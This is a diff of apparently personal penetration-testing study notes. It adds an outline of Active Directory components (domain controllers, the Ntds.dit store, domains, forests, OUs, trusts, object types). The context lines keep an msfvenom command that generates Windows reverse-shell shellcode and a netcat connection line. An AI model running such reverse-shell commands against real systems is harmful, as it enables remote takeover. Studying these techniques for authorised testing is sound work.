@@ -212,7 +212,81 @@ kali    - nc -nv 192.168.1.100 9999
         
         #gen shellcode and get root
         msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
-        
+
+
+
+#Active Directory Overview
+manage windows domain networks
+stores info of objs - commp, users, printers...
+Kerberos authentication
+non windwos devices(authentication) - RADIUS, LDAP
+Abuse features, trusts, components, policies...
+
+Physical AD components
+DC - server with AD DS role promoted to DC
+   - host AD DS directory store
+   - authentication and authorization
+   - Replicate updates to other DCs in the domain and forest
+   - manage user accouts and network resources
+AD DS Data store - database files and processes that store and manage directory info for users, services, and apps.
+                 - has Ntds.dit file
+                 - default folder %SystemRoot%\NTDS on all DCs
+                 - accessible only thru DC processes and protocols
+
+Logical AD components
+AD DS Schema - defines objects
+             - enfoce rules on obj creation and config
+Domains - group and manage objs
+        - administrative boundary for replicating applying policies to groups of objs
+        - replication boundary for replicating data btn DCs
+        - authentication and authorization boundary that provides a way to limit scope of access to resources
+Trees - Hierarchy of domains in AD DS
+      - share contiguous namespace with parent domain
+      - Can have additional domains
+      - By default creates a two-way transitive trust with other domains
+Forests - collection of domain trees
+        - common schema
+        - common config partition
+        - common global catalog to enable searching
+        - enable trusts btn domains in the forest
+        - share enterprise admins and schema admins groups
+Organizational Units(OUs) - AD containers with users, groups, comps and other OUs
+                          - Rep org hierarchically and logically
+                          - manage collection of objs consistently
+                          - delegate permission to administer groups of objs
+                          - apply policies
+Trusts - mechanisms for users to gain access to recs in another domain
+       - Directional - trust direction from trusting domain to trusted domain
+       - Transitive - trust beyond two-domain trust to other trusted domains
+       - all domains in a forest trust other doamins in the forest
+       - trusts can extend outside the forest
+Objects - User - enables net recs access for user
+        - InetOrgPerson - similar to user acc
+                        - for compatibility with other directory services
+        - Contacts - assign emails to external users
+                   - does not enable network access
+        - Groups - simplify administration of access control
+        - Comps- enable authentication and auditing of comp access to recs
+        - Printers - simplify location and connection to printers
+        - Shared folders - enables users search for shared folders based on properties
+
+
+
+#AD lab
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
